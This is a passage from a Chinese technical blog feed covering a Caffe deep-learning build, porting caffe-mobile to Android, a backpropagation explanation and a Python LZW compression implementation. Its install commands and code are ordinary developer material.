MKL</span></span><br><span class="line"><span class="comment"># open for OpenBlas</span></span><br><span class="line">BLAS := atlas</span><br><span class="line"><span class="string">&#x27;如果用的是ATLAS计算库则赋值atlas，MKL计算库则用mkl赋值，OpenBlas则赋值open&#x27;</span></span><br><span class="line"><span class="string">&#x27;caffe默认是atlas&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom (MKL/ATLAS/OpenBLAS) include and lib directories.</span></span><br><span class="line"><span class="comment"># Leave commented to accept the defaults for your choice of BLAS</span></span><br><span class="line"><span class="comment"># (which should work)!</span></span><br><span class="line"><span class="comment"># BLAS_INCLUDE := /path/to/your/blas</span></span><br><span class="line"><span class="comment"># BLAS_LIB := /path/to/your/blas</span></span><br><span class="line"><span class="string">&#x27;如果是默认位置安装的atlas（apt-get方式）则保留注释，否则取消注释并输入安装目录&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Homebrew puts openblas in a directory that is not on the standard search path</span></span><br><span class="line"><span class="comment"># BLAS_INCLUDE := $(shell brew --prefix openblas)/include</span></span><br><span class="line"><span class="comment"># BLAS_LIB := $(shell brew --prefix openblas)/lib</span></span><br><span class="line"><span class="string">&#x27;如果选择了openblas且不是安装在标准路径则要指明&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This is required only if you will compile the matlab interface.</span></span><br><span class="line"><span class="comment"># MATLAB directory should contain the mex binary in /bin.</span></span><br><span class="line"><span class="comment"># MATLAB_DIR := /usr/local</span></span><br><span class="line"><span class="comment"># MATLAB_DIR := /Applications/MATLAB_R2012b.app</span></span><br><span class="line"><span class="string">&#x27;matlab安装库的目录&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> this is required only if you will compile the python interface.</span></span><br><span class="line"><span class="comment"># We need to be able to find Python.h and numpy/arrayobject.h.</span></span><br><span class="line">PYTHON_INCLUDE := /usr/include/python2.7 \</span><br><span class="line">                /usr/local/lib/python2.7/dist-packages/numpy/core/include</span><br><span class="line"><span class="string">&#x27;python安装目录，这里要注意第二行位置，ubuntu16.04对python2.7的安装位置有小改动&#x27;</span></span><br><span class="line"><span class="string">&#x27;设置的时候可以先cd到该目录下看python是否安在了那里&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Anaconda Python distribution is quite popular. Include path:</span></span><br><span class="line"><span class="comment"># Verify anaconda location, sometimes it&#x27;s in root.</span></span><br><span class="line"><span class="comment"># ANACONDA_HOME := $(HOME)/anaconda</span></span><br><span class="line"><span class="comment"># PYTHON_INCLUDE := $(ANACONDA_HOME)/include \</span></span><br><span class="line">		<span class="comment"># $(ANACONDA_HOME)/include/python2.7 \</span></span><br><span class="line">		<span class="comment"># $(ANACONDA_HOME)/lib/python2.7/site-packages/numpy/core/include</span></span><br><span class="line"><span class="string">&#x27;如果安装了anaconda（一款集成了许多库的python）则需要把python相关目录设置到anaconda目录&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment to use Python 3 (default is Python 2)</span></span><br><span class="line"><span class="comment"># PYTHON_LIBRARIES := boost_python3 python3.5m</span></span><br><span class="line"><span class="comment"># PYTHON_INCLUDE := /usr/include/python3.5m \</span></span><br><span class="line"><span class="comment">#                 /usr/lib/python3.5/dist-packages/numpy/core/include</span></span><br><span class="line"><span class="string">&#x27;默认使用python2.7,取消注释则使用python3.5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We need to be able to find libpythonX.X.so or .dylib.</span></span><br><span class="line">PYTHON_LIB := /usr/lib</span><br><span class="line"><span class="comment"># PYTHON_LIB := $(ANACONDA_HOME)/lib</span></span><br><span class="line"><span class="string">&#x27;python库的位置，安装了anaconda的话似乎也得改&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Homebrew installs numpy in a non standard path (keg only)</span></span><br><span class="line"><span class="comment"># PYTHON_INCLUDE += $(dir $(shell python -c &#x27;import numpy.core; print(numpy.core.__file__)&#x27;))/include</span></span><br><span class="line"><span class="comment"># PYTHON_LIB += $(shell brew --prefix numpy)/lib</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment to support layers written in Python (will link against Python libs)</span></span><br><span class="line"> WITH_PYTHON_LAYER := 1</span><br><span class="line"><span class="string">&#x27;如果要用python来写框架中的layer则取消注释&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Whatever else you find you need goes here.</span></span><br><span class="line">INCLUDE_DIRS := $(PYTHON_INCLUDE) /usr/local/include /usr/include/hdf5/serial</span><br><span class="line">LIBRARY_DIRS := $(PYTHON_LIB) /usr/local/lib /usr/lib /usr/lib/x86_64-linux-gnu /usr/lib/x86_64-linux-gnu/hdf5/serial</span><br><span class="line"><span class="string">&#x27;这里注意要加入hdf5的路径，同样建议加入前先cd到这些目录看看是否前面安装成功了&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If Homebrew is installed at a non standard location (for example your home directory) and you use it for general dependencies</span></span><br><span class="line"><span class="comment"># INCLUDE_DIRS += $(shell brew --prefix)/include</span></span><br><span class="line"><span class="comment"># LIBRARY_DIRS += $(shell brew --prefix)/lib</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># NCCL acceleration switch (uncomment to build with NCCL)</span></span><br><span class="line"><span class="comment"># https://github.com/NVIDIA/nccl (last tested version: v1.2.3-1+cuda8.0)</span></span><br><span class="line"><span class="comment"># USE_NCCL := 1</span></span><br><span class="line"><span class="string">&#x27;nccl是GPU多卡并行中使用的通信框架，穷比瑟瑟发抖&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment to use `pkg-config` to specify OpenCV library paths.</span></span><br><span class="line"><span class="comment"># (Usually not necessary -- OpenCV libraries are normally installed in one of the above $LIBRARY_DIRS.)</span></span><br><span class="line"><span class="comment"># USE_PKG_CONFIG := 1</span></span><br><span class="line"><span class="string">&#x27;opencv装好了就不用管&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># N.B. both build and distribute dirs are cleared on `make clean`</span></span><br><span class="line">BUILD_DIR := build</span><br><span class="line">DISTRIBUTE_DIR := distribute</span><br><span class="line"><span class="string">&#x27;build目录，注意如果build中途失败了应该执行 make clean 后再重新build&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment for debugging. Does not work on OSX due to https://github.com/BVLC/caffe/issues/171</span></span><br><span class="line"><span class="comment"># DEBUG := 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The ID of the GPU that &#x27;make runtest&#x27; will use to run unit tests.</span></span><br><span class="line">TEST_GPUID := 0</span><br><span class="line"><span class="string">&#x27;所用的GPU的ID编号，单卡就是0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable pretty build (comment to see full commands)</span></span><br><span class="line">Q ?= @</span><br></pre></td></tr></table></figure>

<p>修改相关文件避免gcc版本问题</p>
<ul>
<li>修改makefile文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#181行位置</span></span><br><span class="line">LIBRARIES += glog gflags protobuf boost_system boost_filesystem m hdf5_hl hdf5</span><br><span class="line">替换为：</span><br><span class="line">LIBRARIES += glog gflags protobuf boost_system boost_filesystem m hdf5_hl hdf5 opencv_core opencv_imgproc opencv_imgcodecs opencv_highgui</span><br><span class="line"></span><br><span class="line"><span class="comment">#415行位置</span></span><br><span class="line">NVCCFLAGS +=-ccbin=$(CXX) -Xcompiler-fPIC $(COMMON_FLAGS)</span><br><span class="line">替换为：</span><br><span class="line">NVCCFLAGS += -D_FORCE_INLINES -ccbin=$(CXX) -Xcompiler -fPIC $(COMMON_FLAGS)</span><br></pre></td></tr></table></figure>

<ul>
<li>修改&#x2F;usr&#x2F;local&#x2F;cuda&#x2F;include&#x2F;host_config.h，注释掉第119行</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#119行位置</span></span><br><span class="line"><span class="comment">#error -- unsupported GNU version! gcc versions later than 5 are not supported!</span></span><br><span class="line">改为</span><br><span class="line">//<span class="comment">#error -- unsupported GNU version! gcc versions later than 5 are not supported!</span></span><br></pre></td></tr></table></figure>

<h2 id="编译caffe"><a href="#编译caffe" class="headerlink" title="编译caffe"></a>编译caffe</h2><p>在caffe目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make all -j4  </span><br><span class="line">make <span class="built_in">test</span> -j4  </span><br><span class="line">make runtest  </span><br><span class="line">make pycaffe  </span><br></pre></td></tr></table></figure>

<p>编译通过则说明安装正确。</p>
<p>使用MNIST手写数据集测试</p>
<p>mnist是一个手写数字库，训练样本为60000张，测试样本为10000张，每个样本为28x28大小的黑白图片，手写数字为0-9，因此分为10类。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> caffe <span class="comment">#你的caffe安装目录    </span></span><br><span class="line">sudo sh ./data/mnist/get_mnist.sh    <span class="comment">#下载数据</span></span><br><span class="line">sudo sh ./examples/mnist/create_mnist.sh <span class="comment">#转换成lmdb数据</span></span><br><span class="line">sudo sh ./examples/mnist/train_lenet.sh <span class="comment">#训练模型</span></span><br><span class="line"><span class="comment">#全局参数和网络参数可以在lenet_solver.prototxt与train_lenet.prototxt文件中进行设置</span></span><br></pre></td></tr></table></figure>
<p>gpu+cuda情况下几分钟即可完成训练，训练完成后会生成caffemodel文件，这种训练好的模型也可以用在其它平台的caffe网络中。</p>
<p><img src="/1004/caffe1.png"></p>
<p>链接python与caffe</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gedit ~/.bashrc  <span class="comment">#打开  </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PYTHONPATH=/你的caffe的目录/python:<span class="variable">$PYTHONPATH</span>   </span><br><span class="line"><span class="comment">#可以通过在python目录下右键打开终端，输入pwd获取绝对路径</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc   <span class="comment">#生效 </span></span><br></pre></td></tr></table></figure>

<p>测试是否链接成功</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"><span class="keyword">import</span> caffe</span><br><span class="line">caffe.__version__</span><br></pre></td></tr></table></figure>

<p>出现版本信息即成功。</p>
<p><img src="/1004/caffe2.png"></p>
]]></content>
      <tags>
        <tag>opencv</tag>
        <tag>caffe</tag>
        <tag>deep learning</tag>
      </tags>
  </entry>
  <entry>
    <title>在 Android上移植solrex改写的 Caffe 深度学习框架</title>
    <url>/1005/</url>
    <content><![CDATA[<p>目前来看，深度学习框架在移动端的移植，主要是要实现在移动端跑起来预处理模型（pre-trained models），然后做检测识别等工作。由此可见如何缩小训练的network并且保持performance是这方面的核心点。</p>
<p>而对于模型训练的方面，由于移动端电量及计算能力的限制，即使使用GPU加速也远不及服务器训练效率，所以近期似乎不会有太大的变革。</p>
<p>当然如果移动端能达到较高的训练效率，无疑具有很多优势。比如可以在用户端训练私人数据而不担心隐私泄露问题等等。这样或许能构成通用模型（服务器训练）加上个性化模型（用户端训练）的整体结构。</p>
<span id="more"></span>

<p>这里引用<a href="https://www.datasciencecentral.com/profiles/blogs/squeezing-deep-learning-into-mobile-phones-a-practitioner-s-guide"><em>Squeezing Deep Learning into Mobile Phones - A Practitioner’s guide</em></a>的一张图表，列出几个常用的深度学习移动端框架：</p>
<p><img src="/1005/1.png" alt="Running pre-trainde models on mobile"></p>
<p>Caffe 基于 C++ 实现，代码结构简洁易读，有着很好的可移植性。<a href="https://github.com/solrex"><strong>solrex</strong></a>在17年初在 github 上启动了一个 Caffe-Mobile 项目，将 Caffe 移植到 Android&#x2F;iOS 上，并移除后向传播，缩减依赖，精简和修改部分代码，达到了编译速度快，生成体积小的效果。</p>
<p>这篇文章将在Android平台实现<a href="https://github.com/solrex/caffe-mobile"><strong>Caffe-Mobile项目</strong></a>的移植。作者在项目页的<code>README.md</code>文件中已经给出了详细步骤及注意事项，只需依次执行即可。</p>
<h1 id="1-安装cmke及ndk"><a href="#1-安装cmke及ndk" class="headerlink" title="1 安装cmke及ndk"></a>1 安装cmke及ndk</h1><p>ubuntu16.04自带了3.5.1版本的cmake，但作者标注cmake版本会影响build速度。</p>
<p><img src="/1005/2.png"></p>
<p>这里选择3.7.2版本进行安装。</p>
<p>访问cmake官网（<a href="https://cmake.org/files/">https://cmake.org/files/</a> ），找到3.7.2版本的下载得到<code>cmake-3.7.2-Linux-x86_64.tar.gz</code></p>
<p><img src="/1005/cmake1.png"></p>
<p>解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar zxvf cmake-3.7.2-Linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure>

<p>创建软链接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> cmake-3.7.2-Linux-x86_64.tar.gz /usr/local/cmake-3.7.2 <span class="comment">#目录可自选</span></span><br><span class="line"><span class="built_in">ln</span> -sf /usr/local/cmake-3.7.2/bin/* /usr/bin/</span><br></pre></td></tr></table></figure>

<p>最后执行命令测试</p>
<p><img src="/1005/cmake2.png"></p>
<p>现在cmke已经安装了3.7.2版本。</p>
<p>ndk的话到Android NDK官网（<a href="https://developer.android.google.cn/ndk/downloads/index.html">https://developer.android.google.cn/ndk/downloads/index.html</a> ）下载，这里选择<code>android-ndk-r14b-linux-x86_64</code>版本下载。</p>
<p><img src="/1005/ndk1.png"></p>
<p>下载完成后解压即可。</p>
<h1 id="2-使用cmake生成caffe-mobile的lib库"><a href="#2-使用cmake生成caffe-mobile的lib库" class="headerlink" title="2 使用cmake生成caffe-mobile的lib库"></a>2 使用cmake生成caffe-mobile的lib库</h1><p>作者给出了win平台下的编译步骤，无奈测试编译时总会报找不到gfortran的错误，导致openblas不能正常编译。尝试多种方法无效，于是选择在Ubuntu下编译。</p>
<p><code>cd</code>到想要存放项目的位置，执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/solrex/caffe-mobile.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> caffe-mobile</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> NDK_HOME=/path/to/your/ndk  <span class="comment"># C:/path/to/your/ndk on MinGW64 (/c/path/to/your/ndk not work for OpenBLAS)</span></span><br><span class="line">./tools/build_android.sh</span><br></pre></td></tr></table></figure>

<p>编译成功后可以看到在<code>caffe-mobile/examples/android/CaffeSimple/app</code>目录下出现了<code>libs</code>文件夹，其中含有三种arm平台的so文件，在后面android项目编译时可以自由选择。</p>
<h1 id="3-使用Android-Studio-编译-CaffeSimple"><a href="#3-使用Android-Studio-编译-CaffeSimple" class="headerlink" title="3 使用Android Studio 编译 CaffeSimple"></a>3 使用Android Studio 编译 CaffeSimple</h1><p>作者在项目中还提供了 Android&#x2F;iOS 平台上的APP 实现示例 CaffeSimple，展示了在手机上使用 Caffe example 里的 MNIST 示例（深度学习领域的 Hello World）训练出来的 LeNet 模型预测一个手写字符 “8” 图片的过程和结果。</p>
<p>在Android Studio中导入<code>caffe-mobile/examples/android/CaffeSimple</code>项目，打开<code>app/src/main/java/com/yangwenbo/caffesimple</code>目录下的<code>MainActivity.java</code>，可以看到有关文件路径设置的代码。</p>
<p><img src="/1005/3.png"></p>
<p>这里可以自由修改路径，默认是在外置sd卡根目录。</p>
<p>将<code>caffe-mobile/examples/ios/simple/CaffeSimple/data</code>目录下的<code>net.protobin</code>及<code>test_image.jpg</code>，和已经训练好的模型文件<code>lenet_iter_10000.caffemodel</code>（由caffe框架训练得到）三个文件放置到手机相应目录。</p>
<p>如果你还没有搭建caffe框架，可以参考官方教程 <a href="http://caffe.berkeleyvision.org/gathered/examples/mnist.html"><strong>Training LeNet on MNIST with Caffe</strong></a>或者我的另一篇博客<a href="http://gaoteng17.top/caffe/"><strong>Ubuntu16.04+CUDA8.0+Cudnn5.1+Opencv3.2.0+Caffe框架的搭建</strong></a>。</p>
<p>最后<code>Build&amp;Run</code>，就可以体会Caffe在Android利用预训练模型预测手写字符 “8” 图片的过程和结果了。</p>
<p><img src="/1005/screenshot.png"></p>
<p>作者同时提供了ios平台的编译步骤，感兴趣的读者可以自行测试实现。</p>
]]></content>
      <tags>
        <tag>caffe</tag>
        <tag>deep learning</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>如何直观地解释 back propagation 算法？</title>
    <url>/1006/</url>
    <content><![CDATA[<p>本文转自<a href="https://www.zhihu.com/question/27239198/answer/95253534">如何直观地解释 back propagation 算法？ - 龚禹pangolulu的回答 - 知乎</a>。</p>
<p>BackPropagation算法是多层神经网络的训练中举足轻重的算法。</p>
<p>简单的理解，它的确就是复合函数的链式法则，但其在实际运算中的意义比链式法则要大的多。</p>
<p>而理解BP算法原理最直接与清晰的就是根据computation graph了，话不多说，直接上图。</p>
<p><img src="/1006/graph.jpg"></p>
<span id="more"></span>

<p>这里举了一个三层神经网络（一个输入层、一个隐层和一个输出层）的例子，使用了softmax输出层，损失函数使用交叉熵。训练神经网络可以使用梯度下降的方法，重点是计算梯度，也就是损失函数对参数的导数，在图中可以表示为<code>dloss/dW1</code>，<code>dloss/dW2</code>，<code>dloss/db1</code>和<code>dloss/db2</code>。如何计算这些梯度，使用的就是BP算法，其实也就是求导的链式法则。</p>
<p>在每一轮迭代中，首先进行forward propagation，也就是计算computation graph中每个节点的状态：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mul1 = X * W1</span><br><span class="line">add1 = mul1 + b1</span><br><span class="line">tanh1 = tanh(add1)</span><br><span class="line">mul2 = tanh1 * W2</span><br><span class="line">add2 = mul2 + b2</span><br><span class="line">tanh2 = tanh(add2)</span><br><span class="line">loss = softmax_loss(tanh2)</span><br></pre></td></tr></table></figure>

<p>之后进行back propagation，也就是计算computation graph中每个节点相对于损失函数（这里表示为loss）的导数，这里面应用了链式法则。对于<code>dloss/dtanh2</code>, <code>dloss/dadd2</code>等导数，下面省略分子直接表示为<code>dtanh2</code>等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dloss = <span class="number">1</span></span><br><span class="line">dtanh2 = softmax_loss_diff(tanh2) * dloss </span><br><span class="line">dadd2 = tanh_diff(add2) * dtanh2 </span><br><span class="line">db2 = <span class="number">1</span> * dadd2</span><br><span class="line">dmul2 = <span class="number">1</span> * dadd2</span><br><span class="line">dW2 = tanh1 * dmul2</span><br><span class="line">dtanh1 = W2 * dmul2</span><br><span class="line">dadd1 = tanh_diff(add1) * dtanh1</span><br><span class="line">db1 = <span class="number">1</span> * dadd1</span><br><span class="line">dmul1 = <span class="number">1</span> * dadd1</span><br><span class="line">dW1 = X * dmul1</span><br></pre></td></tr></table></figure>

<p>上面的变量都可以用矩阵表示，直接进行矩阵运算。其中dW1，dW2，db1和db2就是我们需要求的参数的梯度。</p>
<p>在编程实现上，每一个计算节点都可以定义两个函数，一个是forward，用于给定输入计算输出；一个是backward，用于给定反向梯度，计算整个表达式（相当于损失函数）相对于这个节点的输入的梯度，应用链式法则就是：这个节点相对于其输入的梯度（直接对输入求导）乘以这个节点接受的反向梯度。</p>
]]></content>
      <tags>
        <tag>deep learning</tag>
        <tag>backpropagation</tag>
      </tags>
  </entry>
  <entry>
    <title>lzw编解码实现</title>
    <url>/1001/</url>
    <content><![CDATA[<p>LZW 压缩技术由以色列人 Lempel 和 Ziv 共同提出，美国人 Welch 将其从概念发展到实用阶段。LZW使用字典库查找方案。它读入待压缩的数据并与一个字典库（库开始是空的）中的字符串对比，如有匹配的字符串，则输出该字符串数据在字典库中的位置索引，否则将该字符串插入字典中。LZW广泛应用于<strong>无损数据压缩</strong>，包括无损图像压缩领域，包括 GIF、TIFF、PNG 等格式图像文件。</p>
<p>本篇文章使用Python3.6工具、win10(64bit)环境，实现LZW的编码及解码流程，并测试编解码效果。除此之外，提出一些改进的想法，并作简单分析与思考。</p>
<span id="more"></span>

<h1 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>LZW的编码思想如以下流程所示：</p>
<ol>
<li>初始化编码字典，其中含有所有可能出现的单字符。</li>
<li>从字典中查找匹配当前字符串前缀的最长字符串W。</li>
<li>将W的字典下标作为编码输出并从当前字符串中删去W。 </li>
<li>将W和W在当前字符串中的后续字符合并添加到编码字典中。</li>
<li>重复步骤2。</li>
</ol>
<p>举例如下：</p>
<p><strong>输入数据流</strong></p>
<table>
<thead>
<tr>
<th>位置</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
</tr>
</thead>
<tbody><tr>
<td>字符</td>
<td>A</td>
<td>B</td>
<td>B</td>
<td>A</td>
<td>B</td>
<td>A</td>
<td>B</td>
<td>A</td>
<td>C</td>
</tr>
</tbody></table>
<p><strong>编码过程</strong></p>
<table>
<thead>
<tr>
<th>序号</th>
<th>位置</th>
<th>索引</th>
<th>字典</th>
<th>输出</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td>1</td>
<td>A</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>2</td>
<td>B</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>3</td>
<td>C</td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>4</td>
<td>AB</td>
<td>1</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>5</td>
<td>BB</td>
<td>2</td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td>6</td>
<td>BA</td>
<td>2</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>7</td>
<td>ABA</td>
<td>4</td>
</tr>
<tr>
<td>5</td>
<td>6</td>
<td>8</td>
<td>ABAC</td>
<td>7</td>
</tr>
<tr>
<td>6</td>
<td></td>
<td></td>
<td></td>
<td>3</td>
</tr>
</tbody></table>
<h2 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h2><p>LZW的解码思想如以下流程所示：</p>
<ol>
<li>初始化解码字典，其中含有所有可能出现的下标(对应编码字典)。</li>
<li>从字典中查找匹配当前待解码字符的下标W。</li>
<li>将P和W对应字符串首字符合并添加到解码字典中。</li>
<li>将W在解码字典中对应的字符串作为解码输出并把输出存为旧字符串P。 </li>
<li>重复步骤2。</li>
</ol>
<p>举例如下：</p>
<p><strong>输入数据流</strong></p>
<table>
<thead>
<tr>
<th>位置</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody><tr>
<td>字符</td>
<td>1</td>
<td>2</td>
<td>2</td>
<td>4</td>
<td>7</td>
<td>3</td>
</tr>
</tbody></table>
<p><strong>解码过程</strong></p>
<table>
<thead>
<tr>
<th>序号</th>
<th>数据</th>
<th>旧字符串</th>
<th>输出</th>
<th>索引</th>
<th>字典</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td>A</td>
<td>1</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td>B</td>
<td>2</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td>C</td>
<td>3</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td></td>
<td>A</td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>A</td>
<td>B</td>
<td>AB</td>
<td>4</td>
</tr>
<tr>
<td>3</td>
<td>2</td>
<td>B</td>
<td>B</td>
<td>BB</td>
<td>5</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>B</td>
<td>AB</td>
<td>BA</td>
<td>6</td>
</tr>
<tr>
<td>5</td>
<td>7</td>
<td>AB</td>
<td>ABA</td>
<td>ABA</td>
<td>7</td>
</tr>
<tr>
<td>6</td>
<td>3</td>
<td>ABA</td>
<td>C</td>
<td>ABAC</td>
<td>8</td>
</tr>
</tbody></table>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><p>待编码原文本存在text.txt中；将lzw编码后的文本存到compress.txt中；之后再次通过lzw解码的文本存到decompress.txt中：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;text.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)         <span class="comment">#待编码文本</span></span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;compress.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>)    <span class="comment">#编码后文本</span></span><br><span class="line">f3 = <span class="built_in">open</span>(<span class="string">&quot;decompress.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">#解码后文本</span></span><br><span class="line"></span><br><span class="line">Input = f1.read()                  <span class="comment">#读取文本</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#lzw编码与解码部分</span></span><br><span class="line">compressed_string = lzw_compress(Input)</span><br><span class="line">decompressed_string = lzw_decompress(compressed_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> compressed_string:        <span class="comment">#将编码文本写入f2</span></span><br><span class="line">	f2.write(pack(<span class="string">&quot;H&quot;</span>, i))	  <span class="comment">#二进制写入以获得更大压缩比</span></span><br><span class="line">f3.write(decompressed_string)      <span class="comment">#将解码文本写入f3</span></span><br><span class="line"></span><br><span class="line">f1.close()                         <span class="comment">#关闭文件，下同</span></span><br><span class="line">f2.close()</span><br><span class="line">f3.close()</span><br></pre></td></tr></table></figure>

<h2 id="编码部分"><a href="#编码部分" class="headerlink" title="编码部分"></a>编码部分</h2><p>首先建立编码字典，其中含有所有可能出现的单字符：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设ASCII码0~255均为初始化字符，编码中添加字符串下标从256开始</span></span><br><span class="line">dictionary = &#123;<span class="built_in">chr</span>(i) : i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>)&#125;</span><br><span class="line">pos = <span class="number">256</span></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span>                   <span class="comment">#初始化前缀串与编码结果集</span></span><br><span class="line">result = []</span><br></pre></td></tr></table></figure>

<p>然后依次对字符串进行编码，动态更改编码字典：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string:            <span class="comment">#遍历待编码文本</span></span><br><span class="line">	pc = p + c				<span class="comment">#取当前串为前缀串加后一字符</span></span><br><span class="line">	<span class="keyword">if</span> pc <span class="keyword">in</span> dictionary:	<span class="comment">#如果当前串在编码字典中</span></span><br><span class="line">		p = pc				<span class="comment">#更新前缀串为当前串</span></span><br><span class="line">	<span class="keyword">else</span>:					<span class="comment">#否则前缀串下标对应码字输出</span></span><br><span class="line">		result.append(dictionary[p])</span><br><span class="line">		dictionary[pc] = pos<span class="comment">#将当前串存到编码字典最后</span></span><br><span class="line">		pos += <span class="number">1</span>			<span class="comment">#编码字典位置指针加一</span></span><br><span class="line">		p = c				<span class="comment">#更新前缀串为当前遍历字符</span></span><br></pre></td></tr></table></figure>

<p>最后返回编码结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> p :						<span class="comment">#保证最后一个字符串编码完成</span></span><br><span class="line">	result.append(dictionary[p])</span><br><span class="line"><span class="keyword">return</span> result				<span class="comment">#返回编码结果</span></span><br></pre></td></tr></table></figure>

<h2 id="解码部分"><a href="#解码部分" class="headerlink" title="解码部分"></a>解码部分</h2><p>首先建立解码字典，其中含有所有可能出现的单字符：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设ASCII码0~255均为初始化字符，解码中添加字符串下标从256开始</span></span><br><span class="line">dictionary = &#123;i : <span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>)&#125;</span><br><span class="line">pos = <span class="number">256</span></span><br><span class="line">result = []						<span class="comment">#初始化解码结果集</span></span><br><span class="line">p = array.pop(<span class="number">0</span>)				<span class="comment">#取首字符初始化前缀串</span></span><br><span class="line">result.append(dictionary[p])	<span class="comment">#首字符解码输出</span></span><br></pre></td></tr></table></figure>

<p>然后依次对字符串进行解码，动态更改解码字典：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> array:              <span class="comment">#遍历待解码文本</span></span><br><span class="line">	<span class="keyword">if</span> c <span class="keyword">in</span> dictionary:      <span class="comment">#如果遍历字符在解码字典中</span></span><br><span class="line">		entry = dictionary[c]<span class="comment">#将该遍历字符赋给当前串</span></span><br><span class="line"><span class="comment">#如果遍历字符不在字典中且与字典下表指针相同（即将加入解码字典）</span></span><br><span class="line">	<span class="keyword">elif</span> c == pos:			 <span class="comment">#将前缀串加首字符赋给当前串</span></span><br><span class="line">		entry = dictionary[p] + dictionary[p][<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">else</span>:					 <span class="comment">#否则编码有误，抛出异常</span></span><br><span class="line">		<span class="keyword">raise</span> ValueError(<span class="string">&#x27;Compressed Error : %s&#x27;</span> % c)</span><br><span class="line">	result.append(entry)	 <span class="comment">#将当前串作为解码输出</span></span><br><span class="line">	<span class="comment">#将前缀串下标对应字符串加当前串首字符合并加入解码字典</span></span><br><span class="line">	dictionary[pos] = dictionary[p] 